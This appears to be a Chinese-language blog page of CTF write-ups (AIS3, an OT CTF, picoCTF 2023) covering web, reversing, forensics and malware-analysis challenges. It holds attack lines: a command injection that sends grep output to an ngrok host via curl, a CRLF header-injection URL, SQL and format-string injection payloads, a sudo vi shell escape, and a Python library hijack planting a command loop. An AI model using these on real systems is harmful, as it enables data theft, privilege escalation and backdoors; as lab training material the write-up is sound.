<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl webhook.trianglesnake.com/?text=123</span><br></pre></td></tr></table></figure>

<p>å‘¼å«èŠå¤©æ©Ÿå™¨äººwebhookè©¦è©¦çœ‹ï¼Œæœ‰æ”¶åˆ°è¨Šæ¯ï¼Œæ‰€ä»¥ç›´æ¥æŠŠflagå·å‡ºä¾†</p>
<p>å› ç‚ºæœ‰WAFé™åˆ¶<code>flag</code>ã€<code>*</code>ï¼Œä½†æˆ‘çŸ¥é“flagçš„prefixäº†ï¼Œæ‰€ä»¥ç›´æ¥éæ­·æ ¹ç›®éŒ„æª”æ¡ˆæ‰¾å‡ºflag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode </span><br><span class="line"><span class="string">&quot;<span class="subst">$(find / -maxdepth 1 -type f -exec grep &#x27;ais3&#x27; &#123;&#125; +)</span>&quot;</span>`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{jUST_3a$y_cOMmaND_INj3c7I0N}</p>
</blockquote>
<h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>æ²’è¾¦æ³•ç¢°åˆ°<code>/flag</code>ä½†æ˜¯å¦‚æœç”±å…§ç¶²æ©Ÿå™¨é€redirectè«‹æ±‚ä¸¦åŒ…å«<code>X-Accel-Redirect</code>headerå°±å¯ä»¥ç©¿é€ã€‚</p>
<p>é€™é¡Œåœ¨è€ƒcrlfæˆªæ–·ï¼Œæˆªæ–·ä¹‹å¾Œå¯ä»¥header injection</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE}</p>
</blockquote>
<h3 id="copypasta"><a href="#copypasta" class="headerlink" title="copypasta"></a>copypasta</h3><p>é¡Œç›®æœ‰sql injectionï¼Œç”¨sqlmap dumpå‡ºæ‰€æœ‰columnå¾Œå¯ä»¥ç›´æ¥å­˜å–&#x2F;posts&#x2F;flag_idï¼Œä½†ä»–æœƒæª¢æŸ¥cookieï¼Œæ‰€ä»¥çµ²è·¯è®Šæˆï¼šé€ésql injectionå‰µå»ºä¸å­˜åœ¨çš„è²¼æ–‡-&gt;é€éstring formatæ’ˆå‡º<code>app.secret_key</code>-&gt;å½é€ cookie-&gt;å­˜å–flagé é¢</p>
<h4 id="é€ésql-injectionå‰µé€ è²¼æ–‡"><a href="#é€ésql-injectionå‰µé€ è²¼æ–‡" class="headerlink" title="é€ésql injectionå‰µé€ è²¼æ–‡"></a>é€ésql injectionå‰µé€ è²¼æ–‡</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source code</span></span><br><span class="line">tmpl = db().cursor().execute(</span><br><span class="line">        <span class="string">f&quot;SELECT * FROM copypasta_template WHERE id = <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span></span><br><span class="line">    ).fetchone()</span><br></pre></td></tr></table></figure>
<p>é€™è£¡å¾ˆæ˜é¡¯ç•™äº†ä¸€å€‹æ´çµ¦æˆ‘å€‘</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;&#123;field.__class__....&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æ­¤æ™‚ä¸‹é¢é€²è¡Œformat stringçš„æ™‚å€™å°±æœƒè¢«injection</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = content.<span class="built_in">format</span>(field=request.form)</span><br></pre></td></tr></table></figure>

<p>é€™é¡Œæ²’æœ‰åšå‡ºä¾†ï¼Œå¡åœ¨Pyton format stringæ¼æ´ï¼Œå¯ä»¥æ‘¸åˆ°magic methodï¼Œä½†æ˜¯å› ç‚ºåœ¨ä¸åŒnamespaceæ²’è¾¦æ³•ç”¨__global__æ’ˆåˆ°<code>app.secret_key</code></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="stateful"><a href="#stateful" class="headerlink" title="stateful"></a>stateful</h3><p>æŠŠæ•´å€‹æµç¨‹åéä¾†åšä¸€æ¬¡ çœŸreversed engineering<br>å…ˆç”¨ghidraæŠŠCå¼„å‡ºä¾†å¾Œç”¨vs code çš„å–ä»£æŠŠæ¯å€‹functionæ”¹æˆprintfï¼Œä¹‹å¾Œç”¨pythonæŠŠå‡ºä¾†çš„functionæ•´å€‹åéä¾†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3618225054(k_target)</span></span><br><span class="line"><span class="string">2057902921(k_target)</span></span><br><span class="line"><span class="string">671274660(k_target)</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">557589375(k_target)</span></span><br><span class="line"><span class="string">3420754995(k_target)</span></span><br><span class="line"><span class="string">3648003850(k_target)</span></span><br><span class="line"><span class="string">1978986903(k_target)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">lst = string.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">lst.reverse()</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;state_&#x27;</span>+i+<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p>æŠŠæ¯å€‹ç‹€æ…‹æ©Ÿçš„function<code>+</code>æ”¹æˆ<code>-</code>ï¼Œç„¶å¾ŒæŠŠ<code>k_target</code>é€†å‘å›æ¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello world! Cplayground is an online sandbox that makes it easy to try out</span></span><br><span class="line"><span class="comment">// code.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> local_14 = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> local_c = <span class="number">0xd7a9bb9e</span>;</span><br><span class="line">  <span class="type">bool</span> bVar1 = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">char</span> k_target[<span class="number">43</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">38</span>,</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="number">128</span>,</span><br><span class="line">  <span class="number">101</span>,</span><br><span class="line">  <span class="number">-20</span>,</span><br><span class="line">  <span class="number">125</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line">state_1978986903(k_target);</span><br><span class="line">state_3648003850(k_target);</span><br><span class="line">state_3420754995(k_target);</span><br><span class="line">state_557589375(k_target);</span><br><span class="line">...</span><br><span class="line">state_2057902921(k_target);</span><br><span class="line">state_3618225054(k_target);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,k_target[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬ä¸Šå°±æ˜¯åè‘—åšä¸€é</p>
<blockquote>
<p>AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-12-20T02:25:29.000Z" title="2023/12/20 ä¸Šåˆ10:25:29">2023-12-20</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-08-28T05:13:54.753Z" title="2024/8/28 ä¸‹åˆ1:13:54">2024-08-28</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/CTF/Writeup/">Writeup</a></span><span class="level-item">2 åˆ†é˜è®€å®Œ (å¤§ç´„305å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/12/20/OT-CTF-writeup/">OT CTF writeup</a></p><div class="content"><h2 id="æƒ¡æ„è»Ÿé«”åˆ†æ"><a href="#æƒ¡æ„è»Ÿé«”åˆ†æ" class="headerlink" title="æƒ¡æ„è»Ÿé«”åˆ†æ"></a>æƒ¡æ„è»Ÿé«”åˆ†æ</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||10.15.1.69:3128||<br>é›£åº¦:ä¸­</p>
</blockquote>
<ol>
<li>æ‰“é–‹ida pro</li>
<li>æŸ¥çœ‹import table</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰ç¶²è·¯é€£ç·šç›¸é—œapi</li>
<li>æŸ¥çœ‹ WinHttpOpen functoinçš„Reference</li>
<li>åœ¨ediä¸­æ‰¾åˆ°ä¸­ç¹¼ä¼ºæœå™¨ipå’Œport</li>
</ol>
<h2 id="æƒ¡æ„è»Ÿé«”åˆ†æ2"><a href="#æƒ¡æ„è»Ÿé«”åˆ†æ2" class="headerlink" title="æƒ¡æ„è»Ÿé«”åˆ†æ2"></a>æƒ¡æ„è»Ÿé«”åˆ†æ2</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||flag{5.39.218.152}||</p>
</blockquote>
<h2 id="åŠ å¯†ç³»çµ±"><a href="#åŠ å¯†ç³»çµ±" class="headerlink" title="åŠ å¯†ç³»çµ±"></a>åŠ å¯†ç³»çµ±</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||flag_EnCryp1||<br>é›£åº¦:é›£</p>
</blockquote>
<ol>
<li>ä½¿ç”¨<a href="factordb.com">factordb.com</a>åˆ†è§£n</li>
<li>å› ç‚ºeæ˜¯2ï¼Œæ‰€ä»¥ä¸å¯èƒ½ç‚ºRSAï¼ŒçŒœæ¸¬ç‚ºrabinç®—æ³•</li>
<li>æœ‰$pã€q$äº†ï¼Œæ‰€ä»¥é †è‘—æŠŠ$m_pã€m_q$æ±‚å‡ºä¾†ï¼Œæœƒæœ‰å››çµ„æ˜æ–‡</li>
<li>æ‰¾å¯ä»¥è®€çš„æ˜æ–‡å°±æ˜¯flagäº†</li>
</ol>
<h2 id="å·¥æ¥­appåˆ†æ"><a href="#å·¥æ¥­appåˆ†æ" class="headerlink" title="å·¥æ¥­appåˆ†æ"></a>å·¥æ¥­appåˆ†æ</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||Flag {g6ghfchijv55fhh8gdd}||<br>é›£åº¦:æ˜“</p>
</blockquote>
<ol>
<li>é¡Œç›®æœ‰é™„apktoolï¼Œç”¨apktool decode apk</li>
<li>æ‘¸ä¸€æ‘¸å°±æ‰¾åˆ°flagäº†</li>
</ol>
<h2 id="Level-L-Modbusç•°å¸¸å°åŒ…"><a href="#Level-L-Modbusç•°å¸¸å°åŒ…" class="headerlink" title="Level_L] Modbusç•°å¸¸å°åŒ…"></a>Level_L] Modbusç•°å¸¸å°åŒ…</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||THISISAOTCTFEASYFLAG||<br>é›£åº¦:æ˜“</p>
</blockquote>
<ol>
<li>é¡Œç›®èªªæ˜¯æ„å¤–æ“²å›ï¼Œç›´æ¥ç”¨filteréæ¿¾exception</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modbus.exception_code</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>æŸ¥çœ‹requestå…§å®¹<br><img src="https://hackmd.io/_uploads/ry-moCTBp.png" alt="image"></li>
</ol>
<h2 id="Level-L-Modbusç•°å¸¸å°åŒ…-1"><a href="#Level-L-Modbusç•°å¸¸å°åŒ…-1" class="headerlink" title="Level_L] Modbusç•°å¸¸å°åŒ…"></a>Level_L] Modbusç•°å¸¸å°åŒ…</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||AN APPLE A DAY KEEPS THE DOCTOR AWAY||<br>é›£åº¦:æ˜“</p>
</blockquote>
<ol>
<li>è—è¨Šæ¯ç™¼çµ¦PLCï¼Œè‹¥æ²’æœ‰æ‹†é–‹å°åŒ…<code>length</code>ä¸€å®šæœƒå¾ˆé•·</li>
<li>æ‰¾<code>length</code>æœ€é•·çš„å°åŒ…</li>
</ol>
<p><img src="https://hackmd.io/_uploads/By1piR6rp.png" alt="image"></p>
<blockquote>
<p>æ¯”åˆ¥çš„å°åŒ…å¤šä¸€å¨hexçš„è³‡æ–™</p>
</blockquote>
<ol start="3">
<li>æŠŠhexè½‰æˆasciiï¼Œå¾—åˆ°flag</li>
</ol>
<p><img src="https://hackmd.io/_uploads/HkGAG01PT.png" alt="image"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-05-29T12:31:19.000Z" title="2023/5/29 ä¸‹åˆ8:31:19">2023-05-29</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-08-28T05:14:02.744Z" title="2024/8/28 ä¸‹åˆ1:14:02">2024-08-28</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/CTF/Writeup/">Writeup</a></span><span class="level-item">12 åˆ†é˜è®€å®Œ (å¤§ç´„1813å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/29/picoCTF-writeup/">picoCTF 2023 writeup</a></p><div class="content"><h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><h3 id="hijacking"><a href="#hijacking" class="headerlink" title="hijacking"></a>hijacking</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA

Description
Getting root access can allow you to read the flag. Luckily there is a 
python file that you might like to play with.
Through Social engineering, we&#39;ve got the credentials to use on the 
server. SSH is running on the server.
</code></pre>
<h4 id="éš¨ä¾¿é€›é€›"><a href="#éš¨ä¾¿é€›é€›" class="headerlink" title="éš¨ä¾¿é€›é€›"></a>éš¨ä¾¿é€›é€›</h4><p><img src="https://hackmd.io/_uploads/BkCIB9eLh.png"><br>ç™¼ç¾&#x2F;challengeè³‡æ–™å¤¾å¾ˆå¯ç–‘ï¼Œä½†æ˜¯æ²’è¾¦æ³•cdé€²å»</p>
<p><img src="https://hackmd.io/_uploads/BJpdBcgIn.png"></p>
<p>æŸ¥çœ‹sudo ç™¼ç¾ä½¿ç”¨è€…å¯ä»¥ç”¨sudoæ¬Šé™ä½¿ç”¨vi<br><img src="https://hackmd.io/_uploads/Hy6NrclIn.png"></p>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line"></span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkEI89xI3.png"><br>privilege escalationäº†ï¼Œå†ä¾†å°±ç›´æ¥Aé€²å»&#x2F;challenge&#x2F;æŠŠflagæ’ˆå‡ºä¾†å°±å¥½</p>
<p><img src="https://hackmd.io/_uploads/rkETIce8h.png"></p>
<blockquote>
<p>picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}</p>
</blockquote>
<h4 id="åŸæœ¬è§£æ³•"><a href="#åŸæœ¬è§£æ³•" class="headerlink" title="åŸæœ¬è§£æ³•"></a>åŸæœ¬è§£æ³•</h4><pre><code>é€™é¡Œç•¶åˆåœ¨è§£çš„æ™‚å€™æ˜¯åœ¨.server.pyè£¡é¢import çš„base64è£¡é¢æé¬¼
åªæ˜¯ä¸çŸ¥é“ç‚ºç”šéº¼åœ¨å¯«writeupçš„æ™‚å€™æ²’è¾¦æ³•ç”¨rootæ¬Šé™åŸ·è¡Œ.server.py
</code></pre>
<p>å…ˆ<code>ls -al</code>ç™¼ç¾æœ‰ä¸€å€‹<code>.server.py</code></p>
<p><code>cat .server.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">ip = <span class="string">&#x27;picoctf.org&#x27;</span></span><br><span class="line">response = os.system(<span class="string">&quot;ping -c 1 &quot;</span> + ip)</span><br><span class="line"><span class="comment">#saving ping details to a variable</span></span><br><span class="line">host_info = socket.gethostbyaddr(ip)</span><br><span class="line"><span class="comment">#getting IP from a domaine</span></span><br><span class="line">host_info_to_str = <span class="built_in">str</span>(host_info[<span class="number">2</span>])</span><br><span class="line">host_info = base64.b64encode(host_info_to_str.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, this is a part of information gathering&quot;</span>,<span class="string">&#x27;Host: &#x27;</span>, host_info)</span><br></pre></td></tr></table></figure>

<p><code>vim .server.py</code>æ²’è¾¦æ³•å‹•<code>.server.py</code>ï¼Œå› ç‚ºä»–æ˜¯readonlyï¼Œä½†æ˜¯æ¬Šé™æ²’æœ‰è¨­å®šåˆ°<code>base64.py</code></p>
<p><strong>åœ¨import fileè£¡é¢åŠ æ–™</strong><br><code>vim /usr/lib/python3.8/base64.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    cmd=<span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(os.popen(cmd).read())</span><br></pre></td></tr></table></figure>

<p><strong>get shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 .server.py</span><br></pre></td></tr></table></figure>

<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Every file gets a flag.
The SOC analyst saw one image been sent back and forth between two
people. They decided to investigate and found out that there was more
than what meets the eye here.
</code></pre>
<p>ä¸‹è¼‰ä¸‹ä¾†ç™¼ç¾æ˜¯ä¸€å¼µåœ–ç‰‡<br>çœ‹ä¸€çœ‹æ„Ÿè¦ºå¾ˆæ­£å¸¸</p>
<p>ç”¨<code>exiftool</code>çœ‹äº†ä¸€ä¸‹æ²’æœ‰æŠŠflagè—åœ¨æŸå€‹æ¬„ä½è£¡</p>
<p><code>strings flag.png</code>çœ‹çœ‹<br><img src="https://hackmd.io/_uploads/BkC8pqxIn.png"><br>ç™¼ç¾è£¡é¢æœ‰é•·å¾—å¾ˆåƒè·¯å¾‘çš„æ±æ±</p>
<p>ç›´æ¥æŠŠ<code>flag.png</code>ç•¶æˆzipè§£å£“ç¸®çœ‹çœ‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip flag.png</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°åŠå¼µflag<br><img src="https://hackmd.io/_uploads/r1xCia5lI2.png"></p>
<blockquote>
<p>picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717}</p>
</blockquote>
<h3 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Someone might have hidden the password in the trace file.
Find the key to unlock this file. This tracefile might be good to analyze.
</code></pre>
<p>é€™é¡Œçµ¦äº†å…©å€‹æª”æ¡ˆï¼Œç¬¬ä¸€å€‹æ˜¯<code>flag.zip</code>å’Œ<code>dump.pcap</code>ã€‚<br>å˜—è©¦è§£å£“ç¸®<code>flag.zip</code>ï¼Œç™¼ç¾éœ€è¦å¯†ç¢¼</p>
<h4 id="å…ˆå¾dump-pcapä¸‹æ‰‹çœ‹çœ‹"><a href="#å…ˆå¾dump-pcapä¸‹æ‰‹çœ‹çœ‹" class="headerlink" title="å…ˆå¾dump.pcapä¸‹æ‰‹çœ‹çœ‹"></a>å…ˆå¾<code>dump.pcap</code>ä¸‹æ‰‹çœ‹çœ‹</h4><p>ç”¨wiresharkæ‰“é–‹<code>dump.pcap</code></p>
<p><img src="https://hackmd.io/_uploads/r11qn2eL2.png"><br>éš¨ä¾¿çœ‹å¹¾å€‹å°åŒ…å¾Œç™¼ç¾éƒ½æœ‰æ˜æ–‡</p>
<p><img src="https://hackmd.io/_uploads/SyH7T2lUh.png"><br>æ‰¾åˆ°ä¸€å€‹è¶…å¯ç–‘çš„å°åŒ…ï¼Œ<code>=</code>çµå°¾å¾ˆå¯èƒ½æ˜¯base64ç·¨ç¢¼çš„å¡«å……å­—å…ƒ</p>
<p>decodeå¾Œå¾—åˆ°åŠæˆªflag</p>
<blockquote>
<p>This is the secret: picoCTF{R34DING_LOKd_</p>
</blockquote>
<p>å›åˆ°<code>flag.zip</code>ï¼Œç›´æ¥é€šéˆæŠŠç¬¬ä¸€æ®µflagç•¶å¯†ç¢¼</p>
<blockquote>
<p>picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878}</p>
</blockquote>
<p>??</p>
<h2 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h2><h3 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h3><pre><code>AUTHOR: JUNI19

Description
Flag format: picoCTF&#123;Malwarename&#125;
The first letter of the malware name should be capitalized and the rest 
lowercase.
Your friend just got hacked and has been asked to pay some bitcoins to 
1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesnâ€™t seem to understand what is 
going on and asks you for advice. Can you identify what malware heâ€™s 
being a victim of?
</code></pre>
<p>Google <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code></p>
<p>æ‰¾åˆ°<a target="_blank" rel="noopener" href="https://www.cnbc.com/2017/06/28/ransomware-cyberattack-petya-bitcoin-payment.html">CNBCçš„æ–°è</a><br><img src="https://hackmd.io/_uploads/SkJ-yplUn.png"></p>
<blockquote>
<p>picoCTF{Petya}</p>
</blockquote>
<p>æ°´çˆ›</p>
<h3 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA

Description
Can you make sense of this file?
Download the file here.
</code></pre>
<p>ä¸‹è¼‰<code>enc_flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh</span><br><span class="line">RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk</span><br><span class="line">MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW</span><br><span class="line">VkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZs</span><br><span class="line">aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==</span><br></pre></td></tr></table></figure>
<p>&#x3D;&#x3D;ç¶“å…¸base64</p>
<p>decodeå¾Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX</span><br><span class="line">bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW</span><br><span class="line">MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhi</span><br><span class="line">bTkzVDFWT2JsQlVNRXNLCg==</span><br></pre></td></tr></table></figure>

<p>å†decode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVR</span><br><span class="line">bHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hS</span><br><span class="line">bVZyTVhSWGFteEVXbm93T1VOblBUMEsK</span><br></pre></td></tr></table></figure>

<p>de</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lV</span><br><span class="line">WGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K</span><br></pre></td></tr></table></figure>
<p>deeee</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZN</span><br><span class="line">V1V3TW1Fek1tWjlDZz09Cg==</span><br></pre></td></tr></table></figure>

<p>eeeeeeee</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg==</span><br></pre></td></tr></table></figure>
<p>aaaaaaaaaa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://media.tenor.com/eipo4TRTSKwAAAAd/moe-simpsons-barney-e-moe.gif"></p>
<blockquote>
